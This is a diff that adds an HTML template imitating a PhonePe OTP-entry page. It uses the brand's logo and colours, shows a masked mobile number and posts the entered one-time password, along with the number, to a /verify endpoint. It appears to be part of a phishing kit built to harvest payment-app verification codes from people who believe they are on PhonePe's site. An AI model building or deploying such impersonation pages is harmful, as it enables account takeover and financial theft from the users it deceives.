@@ -1,0 +1,65 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>PhonePe - OTP</title>
+  <link rel="icon" href="/static/logo.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #4a148c;
+      font-family: Arial;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+
+    .box {
+      background: white;
+      width: 90%;
+      max-width: 400px;
+      padding: 50px 30px;
+      border-radius: 12px;
+      box-shadow: 0 0 20px rgba(0, 0, 0, 0.2);
+      text-align: center;
+    }
+
+    img {
+      width: 90px;
+      margin-bottom: 20px;
+    }
+
+    input[type="text"], input[type="submit"] {
+      width: 100%;
+      padding: 16px;
+      margin: 20px 0;
+      font-size: 16px;
+      border-radius: 6px;
+      border: 1px solid #ccc;
+      box-sizing: border-box;
+    }
+
+    input[type="submit"] {
+      background-color: #4a148c;
+      color: white;
+      cursor: pointer;
+    }
+
+    input[type="submit"]:hover {
+      background-color: #380d61;
+    }
+  </style>
+</head>
+<body>
+  <div class="box">
+    <img src="/static/logo.png" alt="PhonePe Logo" style="width: 180px;">
+    <h3>Enter OTP sent to {{ mobile }}</h3>
+    <form action="/verify" method="POST">
+      <input type="hidden" name="mobile" value="{{ mobile }}">
+      <input type="text" name="otp" placeholder="Enter OTP" required>
+      <input type="submit" value="Verify OTP">
+    </form>
+  </div>
+</body>
+</html>
